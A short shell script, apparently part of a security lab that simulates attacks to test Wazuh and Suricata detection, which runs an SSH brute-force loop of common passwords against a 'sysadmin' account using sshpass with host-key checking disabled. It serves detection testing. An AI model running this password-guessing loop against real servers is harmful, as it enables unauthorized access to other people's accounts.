#!/bin/sh
# 3a. SSH brute force: a burst of wrong passwords for a known account, then the
# real one. Meant to trigger Wazuh's sshd auth-failure rule and Suricata's
# connection-burst rule. The server may rate-limit the last tries: that is part
# of the story, so the script always ends cleanly.
. "$(dirname "$0")/../lib.sh"
echo "3a. Force brute SSH sur le compte sysadmin"
on public sh -c '
for p in 123456 password admin root toor qwerty letmein azerty sysadmin azerty123; do
    sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        sysadmin@ssh true 2>/dev/null && echo "mot de passe trouve: $p" && break
done
exit 0
'
